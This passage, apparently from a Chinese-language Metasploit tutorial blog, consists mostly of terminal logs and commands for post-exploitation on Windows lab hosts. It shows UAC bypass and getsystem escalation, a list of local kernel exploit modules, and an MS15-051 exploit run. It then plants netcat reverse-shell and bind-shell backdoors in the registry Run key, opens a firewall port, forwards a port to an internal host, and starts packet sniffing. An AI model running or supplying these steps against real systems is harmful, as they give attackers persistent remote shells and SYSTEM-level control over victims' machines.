<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploaded the agent to the filesystem<span class="token punctuation">..</span><span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Uploading the bypass UAC executable to the filesystem<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter stager executable 73802 bytes long being uploaded<span class="token punctuation">..</span>
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>176195 bytes<span class="token punctuation">)</span> to 192.33.6.200
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 6 opened <span class="token punctuation">(</span>192.33.6.150:8443 -<span class="token operator">></span> 192.33.6.200:62012<span class="token punctuation">)</span> at 2020-06-30 09:42:12 -0400

meterpreter <span class="token operator">></span> getuid 
Server username: WIN-5DTIE0M734E\root
meterpreter <span class="token operator">></span> 
meterpreter <span class="token operator">></span> getsystem 
<span class="token punctuation">..</span>.got system via technique 1 <span class="token punctuation">(</span>Named Pipe Impersonation <span class="token punctuation">(</span>In Memory/Admin<span class="token punctuation">))</span>.
meterpreter <span class="token operator">></span> 
meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> 
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>实战结果可以看到普通用户权限通过绕过UAC可<code>getsystem</code>提权成功。</p>
<ul>
<li>内核漏洞提权</li>
</ul>
<p>这里操作对象是外网www服务器<code>windows server 2003</code>，已拿到一个反弹的meterpreter的shell，后续进行查看补丁信息，然后查找相应的可利用内核漏洞进行提权。</p>
<p>反弹shell、查看补丁信息、IP信息：</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200630235619092.png" alt="image-20200630235619092"></p>
<p>下来可以通过搜索补丁号来查找相应可利用内核提权漏洞：<a href="https://bugs.hacking8.com/tiquan/" target="_blank" rel="noopener">https://bugs.hacking8.com/tiquan/</a></p>
<p>Metasploit相关Windows内核提权漏洞如下：</p>
<pre class="line-numbers language-bash"><code class="language-bash">use exploit/windows/local/ms10_015_kitrap0d
use exploit/windows/local/ms10_092_schelevator
use exploit/windows/local/ms11_080_afdjoinleaf
use exploit/windows/local/ms13_005_hwnd_broadcast
use exploit/windows/local/ms13_053_schlamperei
use exploit/windows/local/ms13_081_track_popup_menu
use exploit/windows/local/ms13_097_ie_registry_symlink
use exploit/windows/local/ms14_009_ie_dfsvc
use exploit/windows/local/ms14_058_track_popup_menu
use exploit/windows/local/ms14_070_tcpip_ioctl
use exploit/windows/local/ms15_004_tswbproxy
use exploit/windows/local/ms15_051_client_copy_image
use exploit/windows/local/ms15_078_atmfd_bof
use exploit/windows/local/ms16_014_wmi_recv_notif
use exploit/windows/local/ms16_016_webdav
use exploit/windows/local/ms16_032_secondary_logon_handle_privesc
use exploit/windows/local/ms16_075_reflection
use exploit/windows/local/ms16_075_reflection_juicy
use exploit/windows/local/ms18_8120_win32k_privesc
use exploit/windows/local/ms_ndproxy<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>这里使用<code>use exploit/windows/local/ms15_051_client_copy_image</code>脚本来进行利用</p>
<p>原始会话权限</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre>
<p>内核提权</p>
<pre class="line-numbers language-bash"><code class="language-bash">msf5 <span class="token operator">></span> use exploit/windows/local/ms15_051_client_copy_image
msf5 exploit<span class="token punctuation">(</span>windows/local/ms15_051_client_copy_image<span class="token punctuation">)</span> <span class="token operator">></span> show options 

Module options <span class="token punctuation">(</span>exploit/windows/local/ms15_051_client_copy_image<span class="token punctuation">)</span>:

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   <span class="token function">yes</span>       The session to run this module on.

Payload options <span class="token punctuation">(</span>windows/meterpreter/reverse_https<span class="token punctuation">)</span>:

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           <span class="token function">yes</span>       Exit technique <span class="token punctuation">(</span>Accepted: <span class="token string">''</span>, seh, thread, process, none<span class="token punctuation">)</span>
   LHOST     192.33.6.150     <span class="token function">yes</span>       The local listener <span class="token function">hostname</span>
   LPORT     8443             <span class="token function">yes</span>       The local listener port
   LURI                       no        The HTTP Path

Exploit target:

   Id  Name
   --  ----
   0   Windows x86

msf5 exploit<span class="token punctuation">(</span>windows/local/ms15_051_client_copy_image<span class="token punctuation">)</span> <span class="token operator">></span> show targets 

Exploit targets:

   Id  Name
   --  ----
   0   Windows x86
   1   Windows x64

msf5 exploit<span class="token punctuation">(</span>windows/local/ms15_051_client_copy_image<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> payload windows/meterpreter/reverse_tcp
payload <span class="token operator">=</span><span class="token operator">></span> windows/meterpreter/reverse_tcp
msf5 exploit<span class="token punctuation">(</span>windows/local/ms15_051_client_copy_image<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token keyword">set</span> session 1
session <span class="token operator">=</span><span class="token operator">></span> 1
msf5 exploit<span class="token punctuation">(</span>windows/local/ms15_051_client_copy_image<span class="token punctuation">)</span> <span class="token operator">></span>
msf5 exploit<span class="token punctuation">(</span>windows/local/ms15_051_client_copy_image<span class="token punctuation">)</span> <span class="token operator">></span> exploit 

<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Started reverse TCP handler on 192.33.6.150:8443 
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Launching notepad to host the exploit<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Process 3064 launched.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Reflectively injecting the exploit DLL into 3064<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Injecting exploit into 3064<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Exploit injected. Injecting payload into 3064<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Payload injected. Executing exploit<span class="token punctuation">..</span>.
<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Exploit finished, <span class="token function">wait</span> <span class="token keyword">for</span> <span class="token punctuation">(</span>hopefully privileged<span class="token punctuation">)</span> payload execution to complete.
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Sending stage <span class="token punctuation">(</span>176195 bytes<span class="token punctuation">)</span> to 192.33.6.200
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Meterpreter session 3 opened <span class="token punctuation">(</span>192.33.6.150:8443 -<span class="token operator">></span> 192.33.6.200:62038<span class="token punctuation">)</span> at 2020-06-30 12:19:39 -0400

meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> getuid 
Server username: NT AUTHORITY\SYSTEM
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>可以看到提权成功（这里windows为32位的，可自行通过systeminfo进行详细查看）</p>
<h3 id="注册表操作-添后门"><a href="#注册表操作-添后门" class="headerlink" title="注册表操作+添后门"></a>注册表操作+添后门</h3><ul>
<li>基本指令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> reg -h
Usage: reg <span class="token punctuation">[</span>command<span class="token punctuation">]</span> <span class="token punctuation">[</span>options<span class="token punctuation">]</span>
Interact with the target machine's registry.

OPTIONS:

    -d <span class="token operator">&lt;</span>opt<span class="token operator">></span>  注册表中存储值的数据
    -h        帮助手册
    -k <span class="token operator">&lt;</span>opt<span class="token operator">></span>  注册表中键的路径 <span class="token punctuation">(</span>E.g. HKLM\Software\Foo<span class="token punctuation">)</span>.
    -r <span class="token operator">&lt;</span>opt<span class="token operator">></span>  The remote machine name to connect to <span class="token punctuation">(</span>with current process credentials
    -t <span class="token operator">&lt;</span>opt<span class="token operator">></span>  注册表中值的类型 <span class="token punctuation">(</span>E.g. REG_SZ<span class="token punctuation">)</span>.
    -v <span class="token operator">&lt;</span>opt<span class="token operator">></span>  注册表中值的名称 <span class="token punctuation">(</span>E.g. Stuff<span class="token punctuation">)</span>.
    -w        Set KEY_WOW64 flag, valid values <span class="token punctuation">[</span>32<span class="token operator">|</span>64<span class="token punctuation">]</span>.
COMMANDS:

    enumkey    枚举可获得的键    <span class="token punctuation">[</span>-k <span class="token operator">&lt;</span>key<span class="token operator">></span><span class="token punctuation">]</span>
    createkey  注册表中添加键    <span class="token punctuation">[</span>-k <span class="token operator">&lt;</span>key<span class="token operator">></span><span class="token punctuation">]</span>
    deletekey  删除注册表中的键  <span class="token punctuation">[</span>-k <span class="token operator">&lt;</span>key<span class="token operator">></span><span class="token punctuation">]</span>
    queryclass Queries the class of the supplied key <span class="token punctuation">[</span>-k <span class="token operator">&lt;</span>key<span class="token operator">></span><span class="token punctuation">]</span>
    setval     设置一个键值 <span class="token punctuation">[</span>-k <span class="token operator">&lt;</span>key<span class="token operator">></span> -v <span class="token operator">&lt;</span>val<span class="token operator">></span> -d <span class="token operator">&lt;</span>data<span class="token operator">></span><span class="token punctuation">]</span>
    deleteval  删除一个键下面存储的值 <span class="token punctuation">[</span>-k <span class="token operator">&lt;</span>key<span class="token operator">></span> -v <span class="token operator">&lt;</span>val<span class="token operator">></span><span class="token punctuation">]</span>
    queryval   查看一个键下面值的数据 <span class="token punctuation">[</span>-k <span class="token operator">&lt;</span>key<span class="token operator">></span> -v <span class="token operator">&lt;</span>val<span class="token operator">></span><span class="token punctuation">]</span>

meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>部分指令演练操作：查看键、值、数据、添加键值</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> reg enumkey -k HKLM\\Software\\Intel\\PSIS
Enumerating: HKLM\Software\Intel\PSIS

  Keys <span class="token punctuation">(</span>1<span class="token punctuation">)</span>:

        PSIS_DECODER

meterpreter <span class="token operator">></span> reg enumkey -k HKLM\\Software\\Intel\\PSIS\\PSIS_DECODER
Enumerating: HKLM\Software\Intel\PSIS\PSIS_DECODER

  Values <span class="token punctuation">(</span>10<span class="token punctuation">)</span>:

        MaxChannelNumber
        ChannelNumber
        DvbNetwork
        EnableDVB_SI
        AtscNetwork
        EnableNetwkProvider
        GraphFile
        VendorID
        AdapterID
        EnableAtsc_PSIP

meterpreter <span class="token operator">></span> 
meterpreter <span class="token operator">></span> reg queryval -k HKLM\\Software\\Intel\\PSIS\\PSIS_DECODER\\ -v EnableDVB_SI
Key: HKLM\Software\Intel\PSIS\PSIS_DECODER\
Name: EnableDVB_SI
Type: REG_BINARY
Data: 00000000
meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> reg setval -k HKLM\\Software\\Intel\\PSIS\\PSIS_DECODER\\ -v hack-q -d <span class="token string">"hacking"</span>
Successfully <span class="token keyword">set</span> hack-q of REG_SZ.
meterpreter <span class="token operator">></span> reg queryval -k HKLM\\Software\\Intel\\PSIS\\PSIS_DECODER\\ -v hack-q
Key: HKLM\Software\Intel\PSIS\PSIS_DECODER\
Name: hack-q
Type: REG_SZ
Data: hacking
meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战1：通过注册表添加NC后门【主动连接-&gt;受害主机主动连接攻击主机】</li>
</ul>
<p>实战环境：</p>
<pre class="line-numbers language-bash"><code class="language-bash">内网主机-<span class="token operator">></span>Windows7 X64
后门NC-<span class="token operator">></span>32位

meterpreter session-<span class="token operator">></span>内网主机：Windows7 X64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>上传后门nc：</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> upload /home/qftm/Desktop/QSec/Pentest/内网渗透/BackToShell/netcat-win32-1.12/nc32.exe C:\\windows\\system32
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> uploading  <span class="token keyword">:</span> /home/qftm/Desktop/QSec/Pentest/内网渗透/BackToShell/netcat-win32-1.12/nc32.exe -<span class="token operator">></span> C:\windows\system32
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> uploaded   <span class="token keyword">:</span> /home/qftm/Desktop/QSec/Pentest/内网渗透/BackToShell/netcat-win32-1.12/nc32.exe -<span class="token operator">></span> C:\windows\system32\nc32.exe
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改注册表添加自启动后门NC：</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#枚举run下的键值</span>
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run

<span class="token comment" spellcheck="true">#设置键值（-d参数：重启之后，自启动程序不会显示在前台执行，而是转为后台，提高隐蔽性）</span>
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v mtfq_nc -d <span class="token string">'C:\windows\system32\nc32.exe -d 192.33.6.150 444 -e cmd.exe'</span>

<span class="token comment" spellcheck="true">#查看键值</span>
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v mtfq_nc  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>操作结果:</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
Enumerating: HKLM\software\microsoft\windows\currentversion\run

No children.
meterpreter <span class="token operator">></span> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v mtfq_nc -d <span class="token string">'C:\windows\system32\nc32.exe -d 192.33.6.150 444 -e cmd.exe'</span>
Successfully <span class="token keyword">set</span> mtfq_nc of REG_SZ.
meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\Run
Enumerating: HKLM\software\microsoft\windows\currentversion\Run

  Values <span class="token punctuation">(</span>1<span class="token punctuation">)</span>:

        mtfq_nc
meterpreter <span class="token operator">></span> reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v mtfq_nc 
Key: HKLM\software\microsoft\windows\currentversion\Run
Name: mtfq_nc
Type: REG_SZ
Data: C:\windows\system32\nc32.exe -d 192.33.6.150 444 -e cmd.exe
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在受害者主机上查看注册表自启动项和后门位置信息：</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200702000608081.png" alt="image-20200702000608081"></p>
<p>本地监听反弹后门nc-&gt;shell：攻击机监听本地444端口、受害机重启内网win7主机</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># nc -lvp 444</span>
listening on <span class="token punctuation">[</span>any<span class="token punctuation">]</span> 444 <span class="token punctuation">..</span>.
192.33.6.200: inverse host lookup failed: Unknown host
connect to <span class="token punctuation">[</span>192.33.6.150<span class="token punctuation">]</span> from <span class="token punctuation">(</span>UNKNOWN<span class="token punctuation">)</span> <span class="token punctuation">[</span>192.33.6.200<span class="token punctuation">]</span> 62657
Microsoft Windows <span class="token punctuation">[</span>�汾 6.1.7601<span class="token punctuation">]</span>
��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2009 Microsoft Corporation����������Ȩ����

C:\Windows\SysWOW64<span class="token operator">></span>whoami
<span class="token function">whoami</span>
win-5dtie0m734e\administrator

C:\Windows\SysWOW64<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对于在内网受害者主机上设置后门NC主动连接的情况下来说：这种方式其实不是太好用，不推荐【推荐被动连接（稳定）】，为什么这么说呢，因为这种利用方式必须要在受害者主机重启之前在攻击机本地开启本地端口的监听，才能在受害者主机重启之后得到nc反弹回来的shell，同时，在攻击机上当我们退出后门shell的时候，再次监听连接是连接不上的，必须要等到下次受害者主机的重启，对权限维持很不友好！！鸡肋。。。。</p>
<ul>
<li>实战2：通过注册表添加NC后门【被动连接-&gt;攻击主机主动连接受害主机】</li>
</ul>
<p>实战环境：</p>
<pre class="line-numbers language-bash"><code class="language-bash">内网主机-<span class="token operator">></span>Windows7 X64
后门NC-<span class="token operator">></span>32位

meterpreter session-<span class="token operator">></span>内网主机：Windows7 X64<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>上传后门nc：</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> upload /home/qftm/Desktop/QSec/Pentest/内网渗透/BackToShell/netcat-win32-1.12/nc32.exe C:\\windows\\system32
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> uploading  <span class="token keyword">:</span> /home/qftm/Desktop/QSec/Pentest/内网渗透/BackToShell/netcat-win32-1.12/nc32.exe -<span class="token operator">></span> C:\windows\system32
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> uploaded   <span class="token keyword">:</span> /home/qftm/Desktop/QSec/Pentest/内网渗透/BackToShell/netcat-win32-1.12/nc32.exe -<span class="token operator">></span> C:\windows\system32\nc32.exe
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
<p>修改注册表添加自启动后门NC：</p>
<pre class="line-numbers language-bash"><code class="language-bash"><span class="token comment" spellcheck="true">#枚举run下的键值</span>
reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run

<span class="token comment" spellcheck="true">#设置键值（-d参数：重启之后，自启动程序不会显示在前台执行，而是转为后台，提高隐蔽性）</span>
reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v mtfq_nc -d <span class="token string">'C:\windows\system32\nc32.exe -Ldp 444 -e cmd.exe'</span>

<span class="token comment" spellcheck="true">#查看键值</span>
reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v mtfq_nc  <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>操作结果:</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\run
Enumerating: HKLM\software\microsoft\windows\currentversion\run

No children.
meterpreter <span class="token operator">></span> reg setval -k HKLM\\software\\microsoft\\windows\\currentversion\\run -v mtfq_nc -d <span class="token string">'C:\windows\system32\nc32.exe -Ldp 444 -e cmd.exe'</span>
Successfully <span class="token keyword">set</span> mtfq_nc of REG_SZ.
meterpreter <span class="token operator">></span>
meterpreter <span class="token operator">></span> reg enumkey -k HKLM\\software\\microsoft\\windows\\currentversion\\Run
Enumerating: HKLM\software\microsoft\windows\currentversion\Run

  Values <span class="token punctuation">(</span>1<span class="token punctuation">)</span>:

        mtfq_nc
meterpreter <span class="token operator">></span> reg queryval -k HKLM\\software\\microsoft\\windows\\currentversion\\Run -v mtfq_nc 
Key: HKLM\software\microsoft\windows\currentversion\Run
Name: mtfq_nc
Type: REG_SZ
Data: C:\windows\system32\nc32.exe -Ldp 444 -e cmd.exe
meterpreter <span class="token operator">></span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>在受害者主机上查看注册表自启动项和后门位置信息：</p>
<p><img src="/2020/06/20/metasploit-framework/image-20200702005340860.png" alt="image-20200702005340860"></p>
<p>防火墙配置：因为是被动连接，所以开放我们刚才设置的端口，444端口,<code>&quot;Firewall&quot;</code>为其描述</p>
<pre class="line-numbers language-bash"><code class="language-bash">netsh firewall add portopening TCP 444 <span class="token string">"FireWall"</span> ENABLE ALL<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> shell 
Process 2796 created.
Channel 4 created.
Microsoft Windows <span class="token punctuation">[</span>�汾 6.1.7601<span class="token punctuation">]</span>
��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32<span class="token operator">></span>chcp 65001
chcp 65001
Active code page: 65001

C:\Windows\system32<span class="token operator">></span>netsh firewall add portopening TCP 444 <span class="token string">"FireWall"</span> ENABLE ALL
netsh firewall add portopening TCP 444 <span class="token string">"FireWall"</span> ENABLE ALL

IMPORTANT: Command executed successfully.
However, <span class="token string">"netsh firewall"</span> is deprecated<span class="token punctuation">;</span>
use <span class="token string">"netsh advfirewall firewall"</span> instead.
For <span class="token function">more</span> information on using <span class="token string">"netsh advfirewall firewall"</span> commands
instead of <span class="token string">"netsh firewall"</span>, see KB article 947709
at http://go.microsoft.com/fwlink/?linkid<span class="token operator">=</span>121488 <span class="token keyword">.</span>

Ok.

C:\Windows\system32<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>端口映射：因为后门主机为内网主机，所以外网无法直接连接后门shell</p>
<p>portfwd端口转发：（该配置是在www服务器的meterpreter会话中配置的，而不是内网普通用户主机）</p>
<pre class="line-numbers language-bash"><code class="language-bash">portfwd add -L 192.33.6.200 -l 4455 -p 444 -r 192.168.9.101<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
<p>PS：<code>-L表示外网主机IP、-r表示内网主机IP、-p、-l表示将内网444端口转发到外网主机的4455端口</code></p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> portfwd add -L 192.33.6.150 -l 4455 -p 444 -r 192.168.9.101
<span class="token punctuation">[</span>*<span class="token punctuation">]</span> Local TCP relay created: 192.33.6.150:4455 <span class="token operator">&lt;</span>-<span class="token operator">></span> 192.168.9.101:444
meterpreter <span class="token operator">></span> 
meterpreter <span class="token operator">></span> portfwd list 

Active Port Forwards
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

   Index  Local              Remote              Direction
   -----  -----              ------              ---------
   1      192.33.6.150:4445  192.168.9.101:3389  Forward
   2      192.33.6.150:4455  192.168.9.101:444   Forward

2 total active port forwards.

meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>本地被动连接后门nc-&gt;shell：攻击机连接映射出来的IP+端口-&gt;192.33.6.150+4455、受害机重启内网win7主机</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># nc 192.33.6.150 4455</span>
Microsoft Windows <span class="token punctuation">[</span>�汾 6.1.7601<span class="token punctuation">]</span>
��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32<span class="token operator">></span>whoami
<span class="token function">whoami</span>
win-5dtie0m734e\administrator

C:\Windows\system32<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>对于在内网受害者主机上设置后门NC被动连接的情况下来说：针对权限维持，这种方式利用很好，只要受害者主机重启过，那么攻击者不管什么时候都可以去直接连接后门NC-Shell，即使攻击者连接的shell退出了依然可以重新连接，而不像第一种情况主动连接那样，只能连接一次。</p>
<pre class="line-numbers language-bash"><code class="language-bash"> → Qftm :~/Desktop<span class="token comment" spellcheck="true"># nc 192.33.6.150 4455</span>
Microsoft Windows <span class="token punctuation">[</span>�汾 6.1.7601<span class="token punctuation">]</span>
��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32<span class="token operator">></span>whoami
<span class="token function">whoami</span>
win-5dtie0m734e\administrator

C:\Windows\system32<span class="token operator">></span>exit
 → Qftm :~/Desktop<span class="token comment" spellcheck="true"># nc 192.33.6.150 4455</span>
Microsoft Windows <span class="token punctuation">[</span>�汾 6.1.7601<span class="token punctuation">]</span>
��Ȩ���� <span class="token punctuation">(</span>c<span class="token punctuation">)</span> 2009 Microsoft Corporation����������Ȩ����

C:\Windows\system32<span class="token operator">></span>whoami
<span class="token function">whoami</span>
win-5dtie0m734e\administrator

C:\Windows\system32<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<h3 id="流量抓包"><a href="#流量抓包" class="headerlink" title="流量抓包"></a>流量抓包</h3><ul>
<li>基本指令</li>
</ul>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> load sniffer
Loading extension sniffer<span class="token punctuation">..</span>.Success.
meterpreter <span class="token operator">></span> <span class="token function">help</span> sniffer

Sniffer Commands
<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span>

    Command             Description
    -------             -----------
    sniffer_dump        Retrieve captured packet data to PCAP <span class="token function">file</span>
    sniffer_interfaces  Enumerate all sniffable network interfaces
    sniffer_release     Free captured packets on a specific interface instead of downloading them
    sniffer_start       Start packet capture on a specific interface
    sniffer_stats       View statistics of an active capture
    sniffer_stop        Stop packet capture on a specific interface

meterpreter <span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p>指令解读</p>
<pre class="line-numbers language-bash"><code class="language-bash">load sniffer         <span class="token comment" spellcheck="true">#加载第三方工具</span>
sniffer_interfaces   <span class="token comment" spellcheck="true">#查看网卡</span>
sniffer_start 2      <span class="token comment" spellcheck="true">#选择网卡 开始抓包</span>
sniffer_stats 2      <span class="token comment" spellcheck="true">#查看状态</span>
sniffer_dump 2 /tmp/lab1.pcap  <span class="token comment" spellcheck="true">#导出pcap数据包</span>
sniffer_release 2              <span class="token comment" spellcheck="true">#释放接口上抓取的数据包</span>
sniffer_stop 2                 <span class="token comment" spellcheck="true">#停止抓包</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<ul>
<li>实战：抓取内网主机通信流量</li>
</ul>
<p>这里使用Meterpreter提供的工具sniffer进行流量监听与捕获</p>
<pre class="line-numbers language-bash"><code class="language-bash">meterpreter <span class="token operator">></span> load sniffer 
Loading extension sniffer<span class="token punctuation">..</span>.Success.
meterpreter <span class="token operator">></span> sniffer_interfaces 

1 - <span class="token string">'WAN Miniport (Network Monitor)'</span> <span class="token punctuation">(</span> type:3 mtu:1514 usable:true dhcp:false wifi:false <span class="token punctuation">)</span>
